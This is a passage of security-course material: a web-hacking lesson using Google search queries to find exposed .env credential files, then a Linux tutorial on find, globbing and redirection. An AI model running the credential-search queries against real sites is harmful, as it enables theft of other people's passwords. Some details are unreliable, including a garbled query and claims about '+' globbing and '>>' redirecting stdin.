&lt;h3 id="explore-configurations-using-env-files">Explore Configurations Using &lt;strong>ENV&lt;/strong> files&lt;/h3>
&lt;p>.env is used by various popular web development frameworks to declare general variables and configurations.&lt;/p>
&lt;p>&lt;code>DB_USERNAME filetype:env&lt;/code>&lt;br>
&lt;code>DB_PASSWORD filetype:enc=v&lt;/code>&lt;/p>
&lt;p>By using the command you can find a list of sites that expose their &lt;em>.env&lt;/em> file on the internet.
Developers may accidentally include the &lt;em>.env&lt;/em> file in the public directory of the website, which can cause great harm if cyber criminals find it.&lt;/p>
&lt;p>If you click into any of the exposed .env files, you will notice unencrypted usernames, passwords and IPs are directly exposed in the search results.
&lt;strong>Prevention:&lt;/strong> &lt;em>.env&lt;/em> files should &lt;strong>not&lt;/strong> be in a publicly accessible folder.&lt;/p>
&lt;h2 id="wayback-machine">Wayback Machine&lt;/h2>
&lt;p>The &lt;a href="https://archive.org/web/">Wayback Machine&lt;/a> is a digital archive of the entire internet.
It allows the user to go “back in time” and see what websites looked like in the past.
For a hacker, it can be useful to see what information was displayed on a website a few months ago or even a few years ago.&lt;/p>
&lt;h1 id="wrap-up">Wrap-up&lt;/h1>
&lt;p>In this rapidly evolving world, the technologies we use change at a very fast pace.
We need to constantly implement new systems to help solve the issues that arise.
Since HTTP is stateless, dynamic web applications needed a way to preserve the state between requests, so they used cookies and sessions.&lt;/p>
&lt;p>It’s very important to understand the difference between authentication and authorization.
Almost every web application on the internet today has one form or another of authentication and authorization.
Many &lt;a href="https://techterms.com/definition/framework#:~:text=A%20framework%2C%20or%20software%20framework,programs%20for%20a%20specific%20platform">frameworks&lt;/a> and &lt;a href="https://techterms.com/definition/cms">Content Management Systems&lt;/a> provide built-in implementations of authorization and authentication to make the job of web developers easier.&lt;/p>
&lt;h1 id="browser-extensions">Browser Extensions&lt;/h1>
&lt;p>Some browser extensions can make your life easier when interacting with the websites. Some examples would be:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>EditThisCookie&lt;/strong>: Lets you quickly add, edit or delete a cookie.
It could be useful to open a context-menu with one click and edit a cookie on the fly while navigating, without the need to open the developer tools console.&lt;/p>
&lt;ul>
&lt;li>Google Chrome link: &lt;a href="https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg">https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg&lt;/a>&lt;/li>
&lt;li>Mozilla Firefox link: &lt;a href="https://addons.mozilla.org/en-US/firefox/addon/etc2/">https://addons.mozilla.org/en-US/firefox/addon/etc2/&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>ModHeader&lt;/strong>: Lets you add, modify and remove request headers and response headers. You can use this extension to set &lt;strong>X-Forwarded-For&lt;/strong>, &lt;strong>Authorization&lt;/strong>, &lt;strong>Access-Control-Allow-Origin&lt;/strong> and other headers and remember your settings across your account.&lt;/p>
&lt;ul>
&lt;li>Google Chrome link: &lt;a href="https://chrome.google.com/webstore/detail/modheader/idgpnmonknjnojddfkpgkljpfnnfcklj">https://chrome.google.com/webstore/detail/modheader/idgpnmonknjnojddfkpgkljpfnnfcklj&lt;/a>&lt;/li>
&lt;li>Mozilla Firefox link: &lt;a href="https://addons.mozilla.org/en-US/firefox/addon/modheader-firefox/">https://addons.mozilla.org/en-US/firefox/addon/modheader-firefox/&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Hasher&lt;/strong>: An extension to quickly generate most common &lt;strong>hashes&lt;/strong> (&lt;em>MD5&lt;/em>, &lt;em>SHA-1&lt;/em>, &lt;em>SHA-224&lt;/em>, &lt;em>SHA-256&lt;/em>, &lt;em>SHA-384&lt;/em>, &lt;em>SHA-512&lt;/em>, etc), &lt;strong>ciphers&lt;/strong> (&lt;em>AES-256&lt;/em>, &lt;em>DES&lt;/em>, &lt;em>Triple-DES&lt;/em>, &lt;em>RC4&lt;/em>, etc), &lt;strong>ROT13&lt;/strong>, &lt;strong>HMAC&lt;/strong>, &lt;strong>CRC&lt;/strong> (&lt;em>CRC-8&lt;/em>, &lt;em>CRC 16&lt;/em>), for a given input. You can also convert timestamps to human readable formats, convert numbers from different bases (hex, binary, dec), encode or decode strings and convert between &lt;em>ASCII&lt;/em>, &lt;em>HEX&lt;/em>, &lt;em>UTF-8&lt;/em>, etc.&lt;/p>
&lt;ul>
&lt;li>Google Chrome link: &lt;a href="https://chrome.google.com/webstore/detail/hasher/kignjplbjlocolcfldfhbonmbblpfbjb">https://chrome.google.com/webstore/detail/hasher/kignjplbjlocolcfldfhbonmbblpfbjb&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h1 id="further-reading">Further Reading&lt;/h1>
&lt;ul>
&lt;li>[1] Metropolia University of Applied Sciences - Applied Web Application Security Course&lt;/li>
&lt;li>[2] &lt;a href="https://en.wikipedia.org/wiki/HTTP_cookie">https://en.wikipedia.org/wiki/HTTP_cookie&lt;/a>&lt;/li>
&lt;li>[3] &lt;a href="https://stackoverflow.com/questions/11142882/what-are-cookies-and-sessions-and-how-do-they-relate-to-each-other">https://stackoverflow.com/questions/11142882/what-are-cookies-and-sessions-and-how-do-they-relate-to-each-other&lt;/a>&lt;/li>
&lt;li>[4] &lt;a href="https://docs.python-requests.org/en/master/user/advanced/">https://docs.python-requests.org/en/master/user/advanced/&lt;/a>&lt;/li>
&lt;li>[5] &lt;a href="https://stackoverflow.com/questions/11142882/what-are-cookies-and-sessions-and-how-do-they-relate-to-each-other">https://stackoverflow.com/questions/11142882/what-are-cookies-and-sessions-and-how-do-they-relate-to-each-other&lt;/a>&lt;/li>
&lt;li>[6] &lt;a href="https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg">https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg&lt;/a>&lt;/li>
&lt;li>[7] &lt;a href="https://danielmiessler.com/study/encoding-encryption-hashing-obfuscation/">https://danielmiessler.com/study/encoding-encryption-hashing-obfuscation/&lt;/a>&lt;/li>
&lt;li>[8] &lt;a href="https://searchsecurity.techtarget.com/tip/How-to-encrypt-and-secure-a-website-using-HTTPS">https://searchsecurity.techtarget.com/tip/How-to-encrypt-and-secure-a-website-using-HTTPS&lt;/a>&lt;/li>
&lt;li>[9] &lt;a href="https://www.linkedin.com/learning/asp-dot-net-core-identity-authentication-management">https://www.linkedin.com/learning/asp-dot-net-core-identity-authentication-management&lt;/a>&lt;/li>
&lt;li>[10] &lt;a href="https://techterms.com/definition/authentication">https://techterms.com/definition/authentication&lt;/a>&lt;/li>
&lt;li>[11] &lt;a href="https://www.bugcrowd.com/blog/how-to-find-idor-insecure-direct-object-reference-vulnerabilities-for-large-bounty-rewards/">https://www.bugcrowd.com/blog/how-to-find-idor-insecure-direct-object-reference-vulnerabilities-for-large-bounty-rewards/&lt;/a>&lt;/li>
&lt;li>[12] &lt;a href="https://portswigger.net/web-security/file-path-traversal">https://portswigger.net/web-security/file-path-traversal&lt;/a>&lt;/li>
&lt;li>[13] &lt;a href="https://www.amazon.com/Google-Hacking-Penetration-Testers-1/dp/1931836361">https://www.amazon.com/Google-Hacking-Penetration-Testers-1/dp/1931836361&lt;/a>&lt;/li>
&lt;li>[14] &lt;a href="https://securitytrails.com/blog/google-hacking-techniques">https://securitytrails.com/blog/google-hacking-techniques&lt;/a>&lt;/li>
&lt;li>[15] &lt;a href="https://www.acunetix.com/websitesecurity/google-hacking/">https://www.acunetix.com/websitesecurity/google-hacking/&lt;/a>&lt;/li>
&lt;li>[16] &lt;a href="https://www.sciencedirect.com/science/article/pii/B9781931836364500087">https://www.sciencedirect.com/science/article/pii/B9781931836364500087&lt;/a>&lt;/li>
&lt;/ul>
&lt;h1 id="activities">Activities&lt;/h1>
&lt;p>&lt;strong>1.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Nobody loves me&lt;/a>&lt;br>
&lt;strong>2.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Do you need glasses?&lt;/a>&lt;br>
&lt;strong>3.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Chef hacky mchack&lt;/a>&lt;br>
&lt;strong>4.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Santa&lt;/a>&lt;br>
&lt;strong>5.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Great Names&lt;/a>&lt;br>
&lt;strong>6.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Mind your own business&lt;/a>&lt;br>
&lt;strong>7.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Beep Beep Boop&lt;/a>&lt;br>
&lt;strong>8.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Let&amp;rsquo;s traverse the universe&lt;/a>&lt;br>
&lt;strong>9.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Color&lt;/a>&lt;/p></description></item><item><title>Essentials:</title><link>/essentials/system-exploration/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/system-exploration/</guid><description>
&lt;h1 id="system-exploration">System Exploration&lt;/h1>
&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>In the &lt;a href="../welcome-to-linux">previous session&lt;/a>, we introduced the Linux OS family via Kali Linux.
With its help, we learned about the terminal and about basic file navigation commands, such as &lt;code>ls&lt;/code>, &lt;code>cd&lt;/code>, &lt;code>mkdir&lt;/code>, &lt;code>rm&lt;/code>.
We also talked about processes and the &lt;code>ps&lt;/code> command.&lt;/p>
&lt;p>In today&amp;rsquo;s session, we&amp;rsquo;ll extend these concepts and learn some new commands, that we&amp;rsquo;ll use in order to further &lt;strong>explore&lt;/strong> our systems.
We won&amp;rsquo;t be learning any new Python tricks, but we&amp;rsquo;ll be using it for scripts none&lt;/p>
&lt;h2 id="reminders-and-prerequisites">Reminders and Prerequisites&lt;/h2>
&lt;p>For this session, you need to have a good understanding of last session&amp;rsquo;s Linux concepts:&lt;/p>
&lt;ul>
&lt;li>using the &lt;code>man&lt;/code> pages;&lt;/li>
&lt;li>using &lt;code>Tab&lt;/code>;&lt;/li>
&lt;li>navigating the file system;&lt;/li>
&lt;li>creating and deleting new entries in the file system.&lt;/li>
&lt;/ul>
&lt;p>Make sure you have rehearsed and practiced them before the beginning of today&amp;rsquo;s session.&lt;/p>
&lt;h2 id="continuing-our-exploration">Continuing Our Exploration&lt;/h2>
&lt;p>In the challenge &lt;code>Did You Look Everywhere&lt;/code> from the previous session, you had to &lt;strong>manually&lt;/strong> look for the &lt;code>.flag&lt;/code> file in the given hierarchy.
This, as you probably remember, was slow and frustrating.
We need some means by which to view &lt;strong>an entire hierarchy&lt;/strong> at once, or to look for specific files.&lt;/p>
&lt;p>Good news: such means do exist.&lt;/p>
&lt;h3 id="tree-of-life">Tree of Life&lt;/h3>
&lt;p>The &lt;code>tree&lt;/code> command does what its name suggests: it displays a tree representation of a directory hierarchy.&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# tree /lib/cryptsetup/
/lib/cryptsetup/
├── askpass
├── checks
│   ├── blkid
│   ├── ext2
│   ├── swap
│   ├── un_blkid
│   └── xfs
├── cryptdisks-functions
├── functions
└── scripts
├── decrypt_derived
├── decrypt_gnupg
├── decrypt_gnupg-sc
├── decrypt_keyctl
├── decrypt_opensc
├── decrypt_ssl
└── passdev
&lt;/code>&lt;/pre>&lt;p>We can also specify a &lt;strong>maximum depth&lt;/strong> for &lt;code>tree&lt;/code>&amp;rsquo;s traversal.
Look up the parameter in &lt;code>tree&lt;/code>&amp;rsquo;s &lt;code>man&lt;/code> page.
Once you&amp;rsquo;ve found it, use it in order to set a maximum depth of 2 for the &lt;code>/opt&lt;/code> folder.
Your output should look like this:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# tree &amp;lt;add your paramtere here&amp;gt; /opt/
/opt/
├── google
│   └── chrome
└── Teeth
├── cache
├── etc
├── housekeep
├── README.txt
├── static
└── units
&lt;/code>&lt;/pre>&lt;p>Note that if you set the maximum depth to 1, &lt;code>tree&lt;/code> essentially becomes a fancier looking &lt;code>ls&lt;/code>.&lt;/p>
&lt;h3 id="find-your-way">Find Your Way&lt;/h3>
&lt;p>As far as exploration goes, &lt;code>tree&lt;/code> is a pretty strong tool.
It is capable of instantly displaying an entire file hierarchy.&lt;/p>
&lt;p>But sometimes we have to deal with a large hierarchy in which we know what we&amp;rsquo;re looking for.&lt;/p>
&lt;p>As an example, let&amp;rsquo;s look for the &lt;code>memc.h&lt;/code> header file of the Linux kernel.
It&amp;rsquo;s a small file that defines a tiny part of the communication between the GPU and RAM.
The header files corresponding to the version of your kernel are located in &lt;code>/usr/src/linux-headers-5.6.0-kali2-common&lt;/code>.
Now go look for &lt;code>memc.h&lt;/code>.
Good luck!
You should find it by&amp;hellip; &lt;em>tomorrow&lt;/em>.&lt;/p>
&lt;p>But don&amp;rsquo;t look for it manually.
This would be stupid.
You know what the name of the file is and you know the folder where to &lt;strong>find&lt;/strong> it.
That&amp;rsquo;s a lot of information already.
There is a Linux command that&amp;rsquo;s useful for looking for files with certain particularities (such as names, size, access rights etc.) in a file hierarchy.
Which is exactly what we need!
This command is called &lt;code>find&lt;/code>.
It outputs all files in a directory (and its subdirectories) that match some given properties.
Look up its syntax in the &lt;code>man&lt;/code> page.
Look for the string &amp;ldquo;EXAMPLES&amp;rdquo;.
It should lead you to a section at the end of the &lt;code>man&lt;/code> page, which gives you a series of detailed examples of the command&amp;rsquo;s usage.&lt;/p>
&lt;p>From them and from the commands general description at the beginning of the &lt;code>man&lt;/code> page, we can see that &lt;code>find&lt;/code> is generally used like this:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# find &amp;lt;where to look&amp;gt; &amp;lt;what to look for&amp;gt;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>&amp;lt;where to look&amp;gt;&lt;/code> is quite self-explanatory: it&amp;rsquo;s a path in the file system, from where &lt;code>find&lt;/code> will start to look for what whe told it.
This means that &lt;code>find&lt;/code> traverse the file system &lt;em>down&lt;/em> from the path it&amp;rsquo;s given by looking exhaustively into each of its directories.&lt;/li>
&lt;li>&lt;code>&amp;lt;what to look for&amp;gt;&lt;/code> is where things get more intersting.
We&amp;rsquo;ve already said that we can look for files that match certain properties, such as names, permissions, sizes, types and so on.
Each of these properties can be specified as follows:&lt;/li>
&lt;/ul>
&lt;p>&lt;code>find&lt;/code> can take many more parameters, as described below.&lt;/p>
&lt;h4 id="type">&lt;code>type&lt;/code>&lt;/h4>
&lt;p>This parameter allows us to select either regular files (&lt;code>-type f&lt;/code>), or directories (&lt;code>-type d&lt;/code>) and so on.
Here&amp;rsquo;s an example:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ find /some/random/path -type d
&lt;/code>&lt;/pre>&lt;p>This command will list all subdirectories in &lt;code>/some/random/path&lt;/code>.&lt;/p>
&lt;h4 id="size">&lt;code>size&lt;/code>&lt;/h4>
&lt;p>Filters files by size.
For example, we can look for all files whose sizes are 100 bytes using this command&lt;/p>
&lt;pre tabindex="0">&lt;code>$ find /some/random/path -size 100c
&lt;/code>&lt;/pre>&lt;p>The &lt;code>c&lt;/code> at the end specifies that we&amp;rsquo;re using bytes as unit of measurement.
The size can also be specified in:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>kibibytes&lt;/strong> (1024 bytes) using the letter &lt;code>k&lt;/code>;&lt;/li>
&lt;li>&lt;strong>mebibytes&lt;/strong> (1024 kibibytes) using the letter &lt;code>M&lt;/code>;&lt;/li>
&lt;li>&lt;strong>gibibytes&lt;/strong> (1024 mebibytes) using the letter &lt;code>G&lt;/code>;&lt;/li>
&lt;/ul>
&lt;p>But looking for files with &lt;strong>exactly&lt;/strong> a given size seldom happens.
It is more often the case that we&amp;rsquo;re looking for files &lt;em>smaller&lt;/em> or &lt;em>larger&lt;/em> than some value.
For this reason, we may use the &lt;code>-&lt;/code> (smaller) or &lt;code>+&lt;/code> signs before the actual size, like this:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ find /some/random/path -size +100k # Find all files with a size larger than 100kB.
&lt;/code>&lt;/pre>&lt;h4 id="name">&lt;code>name&lt;/code>&lt;/h4>
&lt;p>This is the simplest property.
It&amp;rsquo;s for when you&amp;rsquo;re looking for a file with a certain name.
For finding the file &lt;code>my_file&lt;/code>, it goes like this:&lt;/p>
&lt;pre tabindex="0">&lt;code>find /some/random/path -name my_file
&lt;/code>&lt;/pre>&lt;p>This parameter is the one we need for our current task.
In order to find the file &lt;code>memc.h&lt;/code>, we&amp;rsquo;ll run:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# find /usr/src/linux-headers-5.6.0-kali2-common/ -name memc.h
/usr/src/linux-headers-5.6.0-kali2-common/arch/arm/include/asm/hardware/memc.h
root@kali:~# cat /usr/src/linux-headers-5.6.0-kali2-common/arch/arm/include/asm/hardware/memc.h
/* SPDX-License-Identifier: GPL-2.0-only */
[...]
#endif
&lt;/code>&lt;/pre>&lt;h3 id="globbing">Globbing&lt;/h3>
&lt;p>But what if we only knew a portion of our filename?
Or what if we intentionally wanted to find all files ending in &lt;code>.log&lt;/code>, for instance?&lt;/p>
&lt;p>For this, we need to use the concept of &lt;strong>globbing&lt;/strong>.
This mechanism defines a set of special characters that are interpreted differently than regular ASCII text.&lt;/p>
&lt;h4 id="-0-or-more-characters">&lt;code>*&lt;/code>: 0 or more characters&lt;/h4>
&lt;p>The &lt;code>*&lt;/code> character is interpreted as any number of characters of any type.
Basically, &lt;code>*&lt;/code> stands for everything and nothing.
Take a look at the example below:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# ls D*
Desktop:
Documents:
Downloads:
&lt;/code>&lt;/pre>&lt;p>The &lt;code>*&lt;/code> makes &lt;code>ls&lt;/code>&amp;rsquo;s parameter &lt;strong>match&lt;/strong> any file name that starts with &lt;code>D&lt;/code>.
You can use &lt;code>*&lt;/code> anywhere in your parameter.
Moreover, any command that takes a file name as input accepts the globbing syntax.
Here&amp;rsquo;s another example:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# find /usr/src/linux-headers-5.6.0-kali2-common -name *group* # List all linux kernel header files whose names contain the word &amp;#34;group&amp;#34;
/usr/src/linux-headers-5.6.0-kali2-common/arch/s390/include/asm/ccwgroup.h
[...]
/usr/src/linux-headers-5.6.0-kali2-common/include/uapi/linux/cgroupstats.h
&lt;/code>&lt;/pre>&lt;p>The most commonly used globbing examples (apart from &lt;code>*&lt;/code>) are listed below.&lt;/p>
&lt;h4 id="-one-or-more-characters">&lt;code>+&lt;/code>: one or more characters&lt;/h4>
&lt;p>This symbol is very similar to &lt;code>*&lt;/code>.
However, &lt;code>+&lt;/code> needs at least one character in order to match the specific string.&lt;/p>
&lt;h4 id="ranges">Ranges&lt;/h4>
&lt;p>&lt;code>[]&lt;/code> represents a &lt;em>range&lt;/em>.
Let&amp;rsquo;s look at the following range: &lt;code>[a-f]&lt;/code>.
It starts at &lt;code>a&lt;/code> and ends with &lt;code>f&lt;/code>, inclusively.
&lt;code>[0-9]&lt;/code>, for example, matches any digit.
Likewise, &lt;code>[A-Z]&lt;/code> matches any capital leter, and so on.&lt;/p>
&lt;p>You can combine ranges.
For instance, &lt;code>[a-zA-Z]&lt;/code> matches any letter.&lt;/p>
&lt;h4 id="sets">Sets&lt;/h4>
&lt;p>In order to represent a set of characters to be matched, &lt;code>{}&lt;/code> are used.
&lt;code>{a,0,m,b}&lt;/code> matches &lt;em>either&lt;/em> &lt;code>a&lt;/code>, &lt;code>0&lt;/code>, &lt;code>m&lt;/code> or &lt;code>b&lt;/code>.&lt;/p>
&lt;h4 id="escaping">Escaping&lt;/h4>
&lt;p>What if we want to match the &lt;code>*&lt;/code> character itself?
Or any of the special characters above, such as &lt;code>+&lt;/code>, &lt;code>[&lt;/code>, &lt;code>]&lt;/code>, &lt;code>{&lt;/code> and &lt;code>}&lt;/code>?
Obviously, we can match &lt;strong>any&lt;/strong> character.
The special characters can be matched by &lt;strong>escaping&lt;/strong> them.&lt;/p>
&lt;p>Escaping is the practice of specifying that a symbol be interpreted as a regular character and not as part of a globbing expression.
This feature is achieved by placing a &lt;code>\&lt;/code> character before any special globbing character that you want to escape.
Here are a few examples:&lt;/p>
&lt;ul>
&lt;li>&lt;code>\*&lt;/code>: matches a literal &lt;code>*&lt;/code>;&lt;/li>
&lt;li>&lt;code>\[&lt;/code>: matches a literal &lt;code>[&lt;/code>;&lt;/li>
&lt;li>&lt;code>{\+,\}}&lt;/code>: matches either a literal &lt;code>+&lt;/code>, or a literal &lt;code>}&lt;/code>.&lt;/li>
&lt;/ul>
&lt;p>You can &lt;strong>combine&lt;/strong> escaped characters and globbing expressions as you please.&lt;/p>
&lt;h3 id="redirecting-streams">Redirecting Streams&lt;/h3>
&lt;p>Any process (remember that Linux commands are processes, too) uses 3 implicit data streams.&lt;/p>
&lt;h4 id="standard-input-stdin">Standard Input (&lt;code>stdin&lt;/code>)&lt;/h4>
&lt;p>This is the &amp;ldquo;place&amp;rdquo; from where the process reads its data.
Many processes read data from the keyboard:&lt;/p>
&lt;ul>
&lt;li>&lt;code>man&lt;/code>&amp;rsquo;s &lt;code>stdin&lt;/code> is the keyboard because it reads user commands and interprets them in order to navigate the current &lt;code>man&lt;/code> page.&lt;/li>
&lt;li>&lt;code>bash&lt;/code>&amp;rsquo;s &lt;code>stdin&lt;/code> is also the keyboard.
&lt;code>bash&lt;/code> reads user input, that is typed into the terminal and then executes those commands.&lt;/li>
&lt;/ul>
&lt;p>The main alternative to getting input from the terminal is using a file.
Strictly from a teaching standpoint, unless given a file, &lt;code>cat&lt;/code> reads its input from the terminal (kinda useless, we know).
Let&amp;rsquo;s showcase the usage of &lt;code>stdin&lt;/code> redirection.
First, let&amp;rsquo;s use &lt;code>cat&lt;/code> without redirection.&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# cat # Read input from the terminal.
SSS Rulz!
SSS Rulz!
^C
root@kali:~# # We used Ctrl + C to close the above cat process.
&lt;/code>&lt;/pre>&lt;p>Now let&amp;rsquo;s redirect &lt;code>cat&lt;/code>&amp;rsquo;s input to a file.
We use &lt;code>&amp;lt;&lt;/code> in order to redirect &lt;code>stdin&lt;/code>.&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# cat &amp;lt; essentials/README.md
# Security Summer School: Security Essentials Track
[...]
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s look more closely at what happens here, as opposed to running &lt;code>cat essentials/README.md&lt;/code>:&lt;/p>
&lt;ul>
&lt;li>&lt;code>cat essentials/README.md&lt;/code> makes the &lt;code>cat&lt;/code> command itself open the &lt;code>essentials/README.md&lt;/code> file and read bytes from it;&lt;/li>
&lt;li>&lt;code>cat &amp;lt; essentials/README.md&lt;/code> has &lt;strong>the underlying &lt;code>bash&lt;/code> process&lt;/strong> read the &lt;code>essentials/README.md&lt;/code> file and &lt;strong>feed its content&lt;/strong> to &lt;code>cat&lt;/code>, which is now reading input &lt;strong>from the underlying &lt;code>bash&lt;/code> process&lt;/strong>.&lt;/li>
&lt;/ul>
&lt;p>The same output is printed, but the mechanism now differs entirely.&lt;/p>
&lt;h4 id="standard-output-stdout">Standard Output (&lt;code>stdout&lt;/code>)&lt;/h4>
&lt;p>&lt;code>stdout&lt;/code> is the complement of &lt;code>stdin&lt;/code>.
A processes output is generally displayed to &lt;code>stdout&lt;/code>.
Generally, this stream is also the terminal.
We&amp;rsquo;ve already seen this feature when running almost any command so far.&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# ls
Desktop essentials Music Public Videos
Documents ghidra_9.1.2_PUBLIC peda %SystemDrive%
Downloads libc-database Pictures Templates
&lt;/code>&lt;/pre>&lt;p>We&amp;rsquo;ve seen this output may times in the previous session.
The names of the directories and files inside the current folder are printed &lt;strong>to &lt;code>stdout&lt;/code>&lt;/strong>, i.e. to the terminal.&lt;/p>
&lt;p>Let&amp;rsquo;s redirect &lt;code>ls&lt;/code>&amp;rsquo;s output to a file:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# ls &amp;gt; ls_output
&lt;/code>&lt;/pre>&lt;p>Notice that now there is &lt;em>seemingly&lt;/em> no output.
In reality, it does exist, but is written by &lt;code>ls&lt;/code> to the &lt;code>ls_output&lt;/code> file instead of the standard &lt;code>stdout&lt;/code> stream (the terminal).&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# cat ls_output # The same files as before. Their layout changes, though.
Desktop
Documents
Downloads
essentials
ghidra_9.1.2_PUBLIC
libc-database
Music
out
peda
Pictures
Public
%SystemDrive%
Templates
Videos
&lt;/code>&lt;/pre>&lt;h4 id="standard-error-stderr">Standard Error (&lt;code>stderr&lt;/code>)&lt;/h4>
&lt;p>Sometimes commands fail.
If you haven&amp;rsquo;t encountered one, you haven&amp;rsquo;t been using Linux for long enough.
Here&amp;rsquo;s a simple error:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# ls whatever
ls: cannot access &amp;#39;whatever&amp;#39;: No such file or directory
&lt;/code>&lt;/pre>&lt;p>The error message (&lt;code>ls: cannot access 'whatever': No such file or directory&lt;/code>) is displayed to the terminal, so it would make sense for it to be printed by &lt;code>ls&lt;/code> to &lt;code>stdout&lt;/code>, right?
Well&amp;hellip; no.
It&amp;rsquo;s printed to another stream, called &lt;code>stderr&lt;/code>.
As its name implies, this stream is dedicated to error messages.
This distinction was made in order for users to be able to separate between useful / legitimate output and sometimes unimportant error messages.&lt;/p>
&lt;p>Redirecting &lt;code>stderr&lt;/code> is performed using 2 characters: &lt;code>2&amp;gt;&lt;/code>.&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# ls whatever 2&amp;gt; ls_error
root@kali:~# # No error message. The error itself still did happen.
root@kali:~# cat ls_error # I told you so...
ls: cannot access &amp;#39;whatever&amp;#39;: No such file or directory
&lt;/code>&lt;/pre>&lt;h4 id="appending">Appending&lt;/h4>
&lt;p>Let&amp;rsquo;s redirect &lt;code>ls&lt;/code>&amp;rsquo;s output multiple times:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# ls essentials &amp;gt; out
root@kali:~# cat out
application-lifetime
assembly-language
binary-analysis
data-representation
data-security
explaining-the-internet
hacking-the-web
README.md
rediscovering-the-browser
system-exploration
taming-the-stack
welcome-to-linux
root@kali:~# ls &amp;gt; out
root@kali:~# cat out
Desktop
Documents
Downloads
essentials
ghidra_9.1.2_PUBLIC
libc-database
Music
out
peda
Pictures
Public
%SystemDrive%
Templates
Videos
&lt;/code>&lt;/pre>&lt;p>As you can see, when the second &lt;code>ls&lt;/code> output is written to the &lt;code>out&lt;/code> file, the first output is &lt;strong>overwritten&lt;/strong>.
This sucks in case we want to generate large output files, such as logs.&lt;/p>
&lt;p>But fear not!
Instead, remember last session&amp;rsquo;s Python crash course.
More specifically, remember &lt;code>open&lt;/code>&amp;rsquo;s parameters.
The second one was &lt;code>mode&lt;/code> and one of the modes is &lt;em>append&lt;/em>, symbolised by the &lt;code>a&lt;/code> character.
This mode makes any text that&amp;rsquo;s written to that specific file to be added at the end of whatever data was already inside it, without overwriting anything.&lt;/p>
&lt;p>We need something similar to that, which can be achieved by using &lt;code>&amp;gt;&amp;gt;&lt;/code> for redirecting &lt;code>stdin&lt;/code> and &lt;code>2&amp;gt;&amp;gt;&lt;/code> for redirecting &lt;code>stderr&lt;/code>.
Here&amp;rsquo;s how it works for the previous &lt;code>ls&lt;/code> commands:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# ls essentials &amp;gt; out # This command also creates the out file. It is irrelevant whether we use &amp;gt; or &amp;gt;&amp;gt;.
root@kali:~# cat out
application-lifetime
assembly-language
binary-analysis
data-representation
data-security
explaining-the-internet
hacking-the-web
README.md
rediscovering-the-browser
system-exploration
taming-the-stack
welcome-to-linux
root@kali:~# ls &amp;gt;&amp;gt; out # This is where the overwriting took place. We&amp;#39;ve now changed command to use &amp;gt;&amp;gt;.
root@kali:~# cat out
application-lifetime
[...]
Videos
&lt;/code>&lt;/pre>&lt;p>Lovely!&lt;/p>
&lt;h4 id="pipes">Pipes&lt;/h4>
&lt;p>Up to now, we&amp;rsquo;ve looked at how to redirect the basic streams of a process to files.
But what if we wanted to redirect &lt;strong>one stream of a process into the stream of another process&lt;/strong>?
Of course we can do this, too, by using the &lt;strong>pipe&lt;/strong> (&lt;code>|&lt;/code>).&lt;/p>
&lt;p>To demonstrate the usage of pipes, we&amp;rsquo;ll introduces the &lt;code>tac&lt;/code> command.
Notice it&amp;rsquo;s &lt;code>cat&lt;/code> in reverse.
This is not arbitrary.
If &lt;code>cat&lt;/code> displays the &lt;strong>lines&lt;/strong> in a file &lt;strong>in order&lt;/strong>, &lt;code>tac&lt;/code> does the same, but &lt;strong>in reverse order&lt;/strong>.
Let&amp;rsquo;s exemplify using the global &lt;code>README.md&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# tac essentials/README.md
1. [Taming the Stack](./taming-the-stack)
1. [Assembly Language](./assembly-language)
1. [Binary Analysis](./binary-analysis)
1. [Application Lifetime](./application-lifetime)
1. [Data Security](./data-security)
1. [Data Representation](./data-representation)
1. [Hacking the Web](./hacking-the-web)
